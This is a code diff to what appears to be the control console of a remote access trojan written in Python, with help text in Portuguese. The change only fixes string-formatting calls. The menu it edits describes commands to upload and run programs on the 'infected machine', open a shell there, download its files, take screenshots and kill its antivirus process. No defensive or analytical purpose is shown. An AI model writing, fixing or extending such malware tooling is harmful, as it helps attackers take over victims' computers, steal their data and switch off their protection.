@@ -6,14 +6,14 @@ from hashlib import sha1 as sha
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 def help():
-    print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.').format(YELLOW, END, RED, END)
-    print('{0}shell{1} - Para obter uma shell na maquina do cliente.').format(RED, END)
-    print('{0}execute{1} - Executa um programa na maquina infectada.\n Ex: execute payload.exe').format(RED, END)
-    print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.\n Ex: download foto.png').format(RED, END)
-    print('{0}screenshot{1} - tira um screenshot da tela do infectado e salva no seu desktop.').format(RED, END)
-    print('{0}killav{1} - Mata o processo de antivirus na maquina do infectado. Apenas funciona no Windows').format(RED, END)
-    print('{0}clear{1} - Limpa a tela.').format(RED, END)
-    print('{0}exit{1} - Sai do programa.').format(RED, END)
+    print('{0}Comandos{1}:\n{2}upload{3} - Escolha um arquivo para fazer upload na maquina infectada.'.format(YELLOW, END, RED, END))
+    print('{0}shell{1} - Para obter uma shell na maquina do cliente.'.format(RED, END))
+    print('{0}execute{1} - Executa um programa na maquina infectada.\n Ex: execute payload.exe'.format(RED, END))
+    print('{0}download{1} - Faz o download de um arquivo na maquina infectada para sua maquina.\n Ex: download foto.png'.format(RED, END))
+    print('{0}screenshot{1} - tira um screenshot da tela do infectado e salva no seu desktop.'.format(RED, END))
+    print('{0}killav{1} - Mata o processo de antivirus na maquina do infectado. Apenas funciona no Windows'.format(RED, END))
+    print('{0}clear{1} - Limpa a tela.'.format(RED, END))
+    print('{0}exit{1} - Sai do programa.'.format(RED, END))
 
 def execute(s, program_name):
     if(len(program_name.split(' ')) == 1):
@@ -157,7 +157,7 @@ def parser(comand, s):
     elif(command == 'exit'):
         sys.exit('Você escolheu sair')
     else:
-        print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
+        print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos'.format(END, RED, END))
         return
 
 def connect(ip, port):
